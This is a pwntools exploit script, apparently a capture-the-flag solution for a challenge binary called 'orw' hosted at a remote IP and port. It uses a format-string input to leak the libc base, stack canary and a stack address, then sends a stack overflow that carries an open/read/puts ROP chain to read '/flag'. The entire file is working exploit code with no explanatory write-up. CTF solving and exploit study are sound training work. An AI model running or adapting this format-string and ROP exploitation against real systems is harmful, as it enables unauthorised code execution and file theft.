from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
libc = ELF('./libc-2.31.so')
elf = ELF('./orw')

context.log_level = 'debug'
debug = 0

if debug:
    io = process('./orw')
else:
    io = remote('210.30.97.133',28055)

def p():
    gdb.attach(proc.pidof(io)[0])

one_gadget = [0xe3b2e,0xe3b31,0xe3b34]

#p()
fmt = b'%3$pAAAA%9$lxA%p'
io.sendafter(b"This is a gift:",fmt)
libc_base =  int(io.recvuntil(b'A' * 4)[-18:-4],16) -  0x10dfd2
canary = int(io.recvuntil(b'\x30\x30'),16)
io.recvuntil(b'A')
stack = int(io.recv(14),16) + 0x30 # buf
success("libc_base -->" + hex(libc_base))
success("canary -->" + hex(canary))
success("stcak -->" + hex(stack))

# orw
## open(flag_strings_addr,0)
## read(3, flag_addr , len)
## write(1, flag_addr , len)
## puts(flag_addr)
flag_addr = stack - 0x30
flag_strings_addr = stack
pop_rdi_ret =  libc_base + 0x0000000000023b6a
pop_rsi_ret = libc_base + 0x000000000002601f # pop rsi ; ret
pop_rdx_ret = libc_base + 0x0000000000142c92 # pop rdx ; ret
open_addr = libc_base + libc.symbols['open']
read_addr = libc_base + libc.symbols['read']
puts_addr = libc_base + libc.symbols['puts']
#orw_chain = flat(
#        pop_rdi_ret , flag_strings_addr , pop_rsi_ret , 0 , open_addr ,
#        pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_ret , 0x100 , read_addr ,
#        pop_rdi_ret , flag_addr , puts_addr)
orw_chain = p64(pop_rdi_ret) + p64(flag_strings_addr) + p64(pop_rsi_ret) + p64(0) + p64(open_addr) 
orw_chain += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(0x100) + p64(read_addr)
orw_chain += p64(pop_rdi_ret) + p64(flag_addr) + p64(puts_addr)

payload = b'/flag\x00\x00\x00' + b'a' * 0x60 + p64(canary) + b'b'*0x8 + orw_chain
io.sendafter(b"tell me your secret",payload)


io.interactive()

